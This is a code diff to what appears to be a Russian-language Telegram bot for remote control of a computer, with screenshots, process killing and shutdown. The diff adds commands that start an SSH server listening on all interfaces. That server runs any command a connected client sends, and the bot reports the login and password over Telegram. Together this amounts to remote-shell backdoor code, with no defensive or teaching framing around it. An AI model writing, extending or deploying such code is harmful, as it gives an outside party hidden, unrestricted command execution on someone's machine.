@@ -27,6 +27,13 @@ os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
 
 bot = TeleBot(BOT_TOKEN)
 
+# ===== SSH ПЕРЕМЕННЫЕ =====
+ssh_server = None
+ssh_thread = None
+SSH_PORT = 2222
+SSH_USER = "swilluser"
+SSH_PASSWORD = "".join(random.choices(string.ascii_letters + string.digits, k=12))
+
 # ===== ФУНКЦИИ =====
 
 def run_command(cmd, timeout=60):
@@ -40,7 +47,61 @@ def send_long_message(chat_id, text):
         for i in range(0, len(text), 4000):
             bot.send_message(chat_id, text[i:i+4000])
 
-# ===== КОМАНДЫ =====
+# ===== SSH СЕРВЕР =====
+
+class SSHServer(paramiko.ServerInterface):
+    def __init__(self):
+        self.event = threading.Event()
+    def check_channel_request(self, kind, chanid):
+        if kind == 'session':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+    def check_auth_password(self, username, password):
+        if username == SSH_USER and password == SSH_PASSWORD:
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
+
+def start_ssh_server():
+    global ssh_server
+    try:
+        import paramiko
+        host_key = paramiko.RSAKey.generate(2048)
+        ssh_server = paramiko.Transport(('0.0.0.0', SSH_PORT))
+        ssh_server.add_server_key(host_key)
+        ssh_server.start_server(server=SSHServer())
+        while True:
+            chan = ssh_server.accept(60)
+            if chan is None:
+                continue
+            threading.Thread(target=handle_ssh_channel, args=(chan,)).start()
+    except Exception as e:
+        print(f"[SSH] Ошибка: {e}")
+
+def handle_ssh_channel(chan):
+    chan.send("SWILL SSH Shell\r\n")
+    while True:
+        try:
+            if chan.recv_ready():
+                data = chan.recv(1024).decode('utf-8')
+                if not data:
+                    break
+                cmd = data.strip()
+                if cmd.lower() == 'exit':
+                    break
+                output = run_command(cmd)
+                chan.send(output + "\r\n")
+        except:
+            break
+    chan.close()
+
+def ssh_status():
+    try:
+        ip = socket.gethostbyname(socket.gethostname())
+    except:
+        ip = "не определен"
+    return f"SSH: {SSH_USER}@{ip}:{SSH_PORT} | Пароль: {SSH_PASSWORD}"
+
+# ===== КОМАНДЫ БОТА =====
 
 @bot.message_handler(commands=['start', 'help'])
 def help_cmd(msg):
@@ -53,6 +114,9 @@ def help_cmd(msg):
 📌 /screenshot — скриншот
 📌 /processes — список процессов
 📌 /kill <PID> — убить процесс
+📌 /ssh_start — запустить SSH-сервер
+📌 /ssh_info — показать SSH-данные
+📌 /ssh_stop — остановить SSH
 📌 /shutdown — выключить
 📌 /reboot — перезагрузить
 """)
@@ -203,6 +267,31 @@ def kill_cmd(msg):
         bot.reply_to(msg, f"✅ Процесс {pid_str} завершён")
     except Exception as e:
         bot.reply_to(msg, f"❌ Ошибка: {str(e)}")
+
+@bot.message_handler(commands=['ssh_start'])
+def ssh_start_cmd(msg):
+    global ssh_thread
+    if ssh_thread and ssh_thread.is_alive():
+        bot.reply_to(msg, "SSH уже запущен\n" + ssh_status())
+        return
+    ssh_thread = threading.Thread(target=start_ssh_server, daemon=True)
+    ssh_thread.start()
+    time.sleep(1)
+    bot.reply_to(msg, f"✅ SSH запущен!\n{ssh_status()}")
+
+@bot.message_handler(commands=['ssh_info'])
+def ssh_info_cmd(msg):
+    bot.reply_to(msg, ssh_status())
+
+@bot.message_handler(commands=['ssh_stop'])
+def ssh_stop_cmd(msg):
+    global ssh_server
+    if ssh_server:
+        ssh_server.close()
+        ssh_server = None
+        bot.reply_to(msg, "SSH остановлен")
+    else:
+        bot.reply_to(msg, "SSH не запущен")
 
 @bot.message_handler(commands=['shutdown'])
 def shutdown_cmd(msg):
